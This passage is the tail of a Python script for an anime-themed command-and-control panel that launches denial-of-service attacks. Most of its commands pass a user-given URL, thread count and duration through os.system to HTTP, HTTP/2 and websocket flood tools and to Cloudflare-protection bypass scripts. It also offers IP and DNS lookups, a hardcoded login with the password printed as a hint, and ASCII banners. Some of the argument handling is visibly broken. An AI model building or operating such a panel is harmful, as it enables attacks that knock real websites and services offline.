                os.system(f'node slow.js {url} {time}')
            except IndexError:
                print('Usage: slow <url> <time>')
                print('Example: slow http://example.com 60')
    
        elif "hyper" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node hyper.js {url} {time}')
            except IndexError:
                print('Usage: hyper <url> <time>')
                print('Example: hyper http://example.com 60')
                
        elif "cf-socket" in cnc:
            try:
                os.system(f'python3 bypass.py')
            except IndexError:
                print('🍃 Cloudflare Bypass Activated!')
    
        elif "cf-pro" in cnc:
            try:
                os.system(f'python3 cf-pro.py')
            except IndexError:
                print('🍃 Advanced Cloudflare Bypass!')
        
        elif "http-socket" in cnc:
            try:
                url = cnc.split()[1]
                per = cnc.split()[2]
                time = cnc.split()
                os.system(f'node HTTP-SOCKET {url} {per} {time}')
            except IndexError:
                print('Usage: http-socket <url> <per> <time>')
                print('Example: http-socket http://example.com 5000 60')

        elif "http-raw" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAW {url} {time}')
            except IndexError:
                print('Usage: http-raw <url> <time>')
                print('Example: http-raw http://example.com 60')

        elif "http-requests" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-REQUESTS {url} {time}')
            except IndexError:
                print('Usage: http-requests <url> <time>')
                print('Example: http-requests http://example.org 60')

        elif "http-rand" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAND.js {url} {time}')
            except IndexError:
                print('Usage: http-rand <url> <time>')
                print('Example: http-rand http://example.com/ 60')

        elif "overflow" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                thread = cnc.split()
                os.system(f'./OVERFLOW {ip} {port} {thread}')
            except IndexError:
                print('Usage: overflow <ip> <port> <threads>')
                print('Example: overflow 1.1.1.1 80 5000')

        elif "cf-bypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                thread = cnc.split()
                os.system(f'node cf.js {url} {time} {thread}')
            except IndexError:
                print('Usage: cf-bypass <url> <time> <threads>')
                print('Example: cf-bypass http://example.com 60 1250')

        elif "uambypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                per = cnc.split()
                os.system(f'node uambypass.js {url} {time} {per} http.txt')
            except IndexError:
                print('Usage: uambypass <url> <time> <req_per_ip>')
                print('Example: uambypass http://example.com 60 1250')

        elif "crash" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run Hulk.go -site {url} -data {method}')
            except IndexError:
                print('Usage: crash <url> METHODS<GET/POST>')
                print('Example: crash http://example.com GET')

        elif "httpflood" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()
                time = cnc.split()
                os.system(f'go run httpflood.go {url} {thread} {method} {time} nil')
            except IndexError:
                print('Usage: httpflood <url> <threads> METHODS<GET/POST> <time>')
                print('Example: httpflood http://example.com 15000 get 60')

        elif "httpget" in cnc:
            try:
                url = cnc.split()[1]
                os.system(f'./httpget {url} 10000 50 100')
            except IndexError:
                print('Usage: httpget <url>')
                print('Example: httpget http://example.com')

# NEW LAYER 7 METHODS
        elif "http2-flood" in cnc:
            try:
                url = cnc.split()[1]
                threads = cnc.split()[2]
                time = cnc.split()
                os.system(f'./http2-flood {url} {threads} {time}')
            except IndexError:
                print('Usage: http2-flood <url> <threads> <time>')
                print('Example: http2-flood https://example.com 800 60')

        elif "websocket-flood" in cnc:
            try:
                url = cnc.split()[1]
                connections = cnc.split()[2]
                time = cnc.split()
                os.system(f'node websocket-flood.js {url} {connections} {time}')
            except IndexError:
                print('Usage: websocket-flood <ws_url> <connections> <time>')
                print('Example: websocket-flood ws://example.com/ws 1000 60')

        elif "http-storm" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node http-storm.js {url} {time}')
            except IndexError:
                print('Usage: http-storm <url> <time>')
                print('Example: http-storm http://example.com 60')

# BANNERS
        elif "troll" in cnc:
            print('''
\x1b[38;2;255;140;0m▒▒▒▒▒▄▄▄▄▄▀▀▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄▒▒▒▒▒▒▒   
\x1b[38;2;255;140;0m▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▀▀▄▒▒▒▒  
\x1b[38;2;255;140;0m▒▒▒▒█▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒  
\x1b[38;2;255;140;0m▒▒▒█▒▒▒▒▒▒▒▒▄█▄▀▄▄▒▒▒▒▒▒▄▄▄▒▒▒▒█▒▒  
\x1b[38;2;255;140;0m▒▄▀▒▄▄▄▒▒█▀▀▀▀▄▄█▒▒▒█▄▄▄█▒▒▒▒▒█▒  
\x1b[38;2;255;140;0m█▒▒█▒▄▒▀▄▄▄▀▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒█  
''')

        elif "pikachu" in cnc:
            print('''
\x1b[38;2;255;255;0m                    ⢠⣤
                  ⢠⣾⣿⣿⡄
                 ⢠⣿⣿⣿⣿⡇
                ⢠⣿⠁  ⹿⡇
                ⣾⡇   ⢸⡇
               ⢸⡁   ⣾⡇
            ⢀⣴⠿⠃   ⠈⠻⢷⣦⣤⡀
        ⢠⣾⠟⠁      ⠈⠿⣷⣄
       ⢠⣿⠃        ⠈⢻⣷⣤⡀
      ⣰⣿⠃          ⠈⠙⠛ⷦ⣄⡀
     ⢠⣾⠟            ⠈⠻⣶⣄
    ⣰⣿⠃              ⠈⢻⣷⣄
   ⢠⣿⣷⣶⣶⣶⣤⣤⣤⣤⣄⣀⡀      ⠈⠻⣷⣤⡀
   ⠈⠉⠉⠉⠉⠉⠉⣹⣿⠟⠋    ⠈⠻⣷⣄  ⠈⠙⠛ⷦ⣄⡀
          ⢠⣾⡟⠁      ⢸⡁    ⠈⣿⡄
         ⠙⠛⠿⢿⣶⣦⣤⣀  ⠈⠳⣤⡀   ⠈⣿⡆
              ⠈⣿⡿⠃⣠⣿⢋⣽⣷   ⠈⣧
              ⢸⡿ ⢹⡟⠓⣶   ⠈⻢⦤⣤⣴⡟
              ⠘⣷⡀  ⠈⣄ ⠈⠓⠶⠶⠶⠞
               ⢻⣷⡀   ⠈⠳⢦⡀   ⢰⣿⣶⣦⣤⣶⣾⣿⣿⣿⣆
               ⠈⠉⠉⠉⠉⠉⠉⣹⣿⠟⠋⠉⠛⠷⣤⣄⡈  ⠉⠛⠿⠿⠿⠛
                      ⢠⣾⡟⠁  ⢸⡁⠁   ⠈⣿⡄
                     ⠙⠛⠿⢿⣶⣦⣤⣀⠈⠳⣤⡀   ⠈⣿⡆
                            ⠈⣿⡿⠃⣠⣿⢋⣽⣷   ⠈⣧
                            ⢸⡿ ⢹⡟⠓⣶   ⠈⻢⦤⣤⣴⡟
                            ⠘⣷⡀  ⠈⣄ ⠈⠓⠶⠶⠶⠞
                             ⢻⣷⡀   ⠈⠳⢦⡀   ⢰⣿⡆
                             ⠈⠻⢦⣤⣤⣤⣾⣿⣷⣶⣶⣿⡿⠃
                                ⠈⠛⠿⠿⠛⠋
''')

        elif "naruto" in cnc:
            print('''
\x1b[38;2;255;140;0m    ⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣀⠀⠀⠀⠀⠀⠀
\x1b[38;2;255;140;0m    ⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀
\x1b[38;2;255;165;0m    ⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀
\x1b[38;2;255;165;0m    ⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀
\x1b[38;2;255;140;0m    ⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀
\x1b[38;2;255;140;0m    ⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷
\x1b[38;2;255;165;0m           🍃 BELIEVE IT! DATTEBAYO! 🍃
''')

        elif "kurama" in cnc:
            print('''
\x1b[38;2;255;165;0m           ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣤⣶⣦⣤⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[38;2;255;140;0m           ⠀⠀⠀⠀⠀⢀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⡀⠀⠀⠀⠀⠀
\x1b[38;2;255;165;0m           ⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀
\x1b[38;2;255;140;0m           ⠀⠲⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠤⠀
\x1b[38;2;255;165;0m           🦊💥 NINE-TAILS CHAKRA UNLEASHED! 💥🦊
''')

        elif "sasuke" in cnc:
            print('''
\x1b[38;2;30;144;255m              ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
\x1b[38;2;30;144;255m              ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠛⠛⠛⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
\x1b[38;2;30;144;255m              ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
\x1b[38;2;30;144;255m                       ⚡ CHIDORI! ⚡
''')

        elif "rasengan" in cnc:
            print('''
\x1b[38;2;30;144;255m              ⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣤⣄⡀⠀⠀⠀⠀⠀
\x1b[38;2;30;144;255m              ⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀
\x1b[38;2;30;144;255m              ⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀⠀
\x1b[38;2;30;144;255m              ⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀
\x1b[38;2;30;144;255m              ⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
\x1b[38;2;30;144;255m              ⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁
\x1b[38;2;30;144;255m              ⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀
\x1b[38;2;30;144;255m              ⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀
\x1b[38;2;30;144;255m                    🌀 RASENGAN! 🌀
''')

        elif "chidori" in cnc:
            print('''
\x1b[38;2;30;144;255m              ⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡
\x1b[38;2;30;144;255m              ⚡  CHIDORI - LIGHTNING BLADE  ⚡
\x1b[38;2;30;144;255m              ⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡
''')

        elif "ramen" in cnc:
            print('''
\x1b[38;2;255;140;0m           🍜🍜🍜🍜🍜🍜🍜🍜🍜🍜🍜
\x1b[38;2;255;140;0m           🍜  ICHIRAKU RAMEN SHOP  🍜
\x1b[38;2;255;140;0m           🍜  NARUTO'S FAVORITE!   🍜
\x1b[38;2;255;140;0m           🍜🍜🍜🍜🍜🍜🍜🍜🍜🍜🍜
''')

        elif "leaf-village" in cnc:
            print('''
\x1b[38;2;255;140;0m              🍃🍃🍃🍃🍃🍃🍃🍃🍃🍃🍃🍃🍃
\x1b[38;2;255;140;0m              🍃    HIDDEN LEAF VILLAGE    🍃
\x1b[38;2;255;140;0m              🍃   WHERE THE FIRE BURNS!   🍃
\x1b[38;2;255;140;0m              🍃🍃🍃🍃🍃🍃🍃🍃🍃🍃🍃🍃🍃
''')

        elif "dragon" in cnc:
            print('''
\x1b[38;2;255;140;0m              🐉🔥🐉🔥🐉🔥🐉🔥🐉🔥🐉
\x1b[38;2;255;140;0m              🔥    DRAGON FIRE JUTSU   🔥
\x1b[38;2;255;140;0m              🐉🔥🐉🔥🐉🔥🐉🔥🐉🔥🐉
''')

# TOOLS
        elif "geoip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/geoip/?q={ip}')
                    print(r.text)
                except:
                    print("[ 🍃 Chakra Network Error :( ]")
            except IndexError:
                print('Usage: geoip <ip>')
                print('Example: geoip 1.1.1.1')

        elif "reverseip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reverseiplookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ 🍃 Chakra Network Error :( ]")
            except IndexError:
                print('Usage: reverseip <ip>')
                print('Example: reverseip 1.1.1.1')

        elif "subnet-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/subnetcalc/?q={ip}')
                    print(r.text)
                except:
                    print("[ 🍃 Chakra Network Error :( ]")
            except IndexError:
                print('Usage: subnet-lookup <cdr/ip + netmask>')
                print('Example: subnet-lookup 192.168.1.0/24')

        elif "asn-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/aslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ 🍃 Chakra Network Error :( ]")
            except IndexError:
                print('Usage: asn-lookup <ip/asn>')
                print('Example: asn-lookup AS15169')

        elif "dns-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/dnslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ 🍃 Chakra Network Error :( ]")
            except IndexError:
                print('Usage: dns-lookup <dns>')
                print('Example: dns-lookup google.com')

        elif "reverse-dns" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reversedns/?q={ip}')
                    print(r.text)
                except:
                    print("[ 🍃 Chakra Network Error :( ]")
            except IndexError:
                print('Usage: reverse-dns <ip/domain>')
                print('Example: reverse-dns 8.8.8.8')

        elif "port-scan" in cnc:
            try:
                target = cnc.split()[1]
                print(f"🍃 Byakugan Port Scan initiated on {target}...")
                print("🍃 [Demo] Common ports: 21,22,23,25,53,80,110,443,993,995")
            except IndexError:
                print('Usage: port-scan <target>')
                print('Example: port-scan example.com')

        elif "whois" in cnc:
            try:
                domain = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/whois/?q={domain}')
                    print(r.text)
                except:
                    print("[ 🍃 Chakra Network Error :( ]")
            except IndexError:
                print('Usage: whois <domain>')
                print('Example: whois google.com')

        elif "ping" in cnc:
            try:
                target = cnc.split()[1]
                os.system(f'ping -c 4 {target}')
            except IndexError:
                print('Usage: ping <target>')
                print('Example: ping google.com')

        elif "traceroute" in cnc:
            try:
                target = cnc.split()[1]
                os.system(f'traceroute {target}')
            except IndexError:
                print('Usage: traceroute <target>')
                print('Example: traceroute google.com')

        elif "help" in cnc:
            print(f'''
\x1b[38;2;255;140;0m🍃═══════════════ NARUTO C2 JUTSU MANUAL ═══════════════🍃

\x1b[38;2;255;165;0mLAYER7   \x1b[38;2;255;255;255m► SHOW LAYER7 METHODS
\x1b[38;2;30;144;255mLAYER4   \x1b[38;2;255;255;255m► SHOW LAYER4 METHODS
\x1b[38;2;255;140;0mAMP      \x1b[38;2;255;255;255m► SHOW AMP METHODS
\x1b[38;2;255;165;0mSPECIAL  \x1b[38;2;255;255;255m► SHOW SPECIAL METHODS
\x1b[38;2;30;144;255mBANNERS  \x1b[38;2;255;255;255m► SHOW COOL ASCII BANNERS
\x1b[38;2;255;140;0mRULES    \x1b[38;2;255;255;255m► SHOW NINJA CODE OF HONOR
\x1b[38;2;255;165;0mPORTS    \x1b[38;2;255;255;255m► SHOW ALL CHAKRA GATES
\x1b[38;2;30;144;255mTOOLS    \x1b[38;2;255;255;255m► SHOW RECONNAISSANCE JUTSU
\x1b[38;2;255;140;0mCLEAR    \x1b[38;2;255;255;255m► CLEAR SCREEN JUTSU

\x1b[38;2;255;140;0m🍥═══════════════════════════════════════════════════════🍥
            ''')

        else:
            try:
                cmmnd = cnc.split()[0]
                print("🍃 Jutsu: [ " + cmmnd + " ] Not Found in the Ninja Arts!")
                print("🍥 Try 'help' to see all available techniques, dattebayo!")
            except IndexError:
                pass


def login():
    clear()
    user = "hokage"
    passwd = "believe"
    username = input("🍃 Ninja Name: ")
    password = getpass.getpass(prompt='🍥 Secret Jutsu: ')
    if username != user or password != passwd:
        print("")
        print("🍃 Access Denied! You're not ready for the Hidden Leaf Dojo...")
        print("🍥 (Hint: Username: hokage, Password: believe)")
        sys.exit(1)
    elif username == user and password == passwd:
        print("🍃 Welcome to the Hidden Leaf C2 Dojo, future Hokage!")
        print("🍥 Believe it! Your ninja journey begins now...")
        time.sleep(0.3)
        ascii_vro()
        main()

login()

